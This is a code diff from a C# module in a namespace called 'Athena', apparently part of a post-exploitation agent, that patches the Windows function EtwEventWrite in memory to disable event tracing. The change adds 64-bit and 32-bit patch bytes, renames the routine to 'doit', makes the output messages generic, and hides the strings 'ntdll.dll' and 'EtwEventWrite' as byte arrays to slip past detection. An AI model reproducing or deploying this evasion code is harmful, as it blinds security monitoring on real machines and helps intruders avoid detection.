@@ -26,25 +26,52 @@ namespace Athena
         {
             try
             {
-                if(PatchEtw(new byte[] { 0xc2, 0x14, 0x00 }))
+
+                if (Environment.Is64BitOperatingSystem)
                 {
-                    return new ResponseResult
+                    if (doit(new byte[] { 0x48, 0x33, 0xC0, 0xC3 }))
                     {
-                        completed = "true",
-                        user_output = "ETW Patched",
-                        task_id = (string)args["task-id"],
-                    };
+                        return new ResponseResult
+                        {
+                            completed = "true",
+                            user_output = "Success",
+                            task_id = (string)args["task-id"],
+                        };
+                    }
+                    else
+                    {
+                        return new ResponseResult
+                        {
+                            completed = "true",
+                            user_output = "Failed",
+                            task_id = (string)args["task-id"],
+                            status = "error"
+                        };
+                    }
                 }
                 else
                 {
-                    return new ResponseResult
+                    if (doit(new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 }))
                     {
-                        completed = "true",
-                        user_output = "Failed to patch ETW",
-                        task_id = (string)args["task-id"], 
-                        status = "error"
-                    };
+                        return new ResponseResult
+                        {
+                            completed = "true",
+                            user_output = "Success",
+                            task_id = (string)args["task-id"],
+                        };
+                    }
+                    else
+                    {
+                        return new ResponseResult
+                        {
+                            completed = "true",
+                            user_output = "Failed",
+                            task_id = (string)args["task-id"],
+                            status = "error"
+                        };
+                    }
                 }
+
             }
             catch (Exception e)
             {
@@ -58,14 +85,16 @@ namespace Athena
                 };
             }
         }
-        private static bool PatchEtw(byte[] patch)
+        private static bool doit(byte[] patch)
         {
             try
             {
                 uint oldProtect;
+                byte[] nb = new byte[] { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c };
+                var ntdll = Win32.LoadLibrary(Encoding.ASCII.GetString(nb));
 
-                var ntdll = Win32.LoadLibrary("ntdll.dll");
-                var etwEventSend = Win32.GetProcAddress(ntdll, "EtwEventWrite");
+                byte[] ew = new byte[] { 0x45, 0x74, 0x77, 0x45, 0x76, 0x65, 0x6e, 0x74, 0x57, 0x72, 0x69, 0x74, 0x65 };
+                var etwEventSend = Win32.GetProcAddress(ntdll, Encoding.ASCII.GetString(ew));
 
                 Win32.VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
                 Marshal.Copy(patch, 0, etwEventSend, patch.Length);
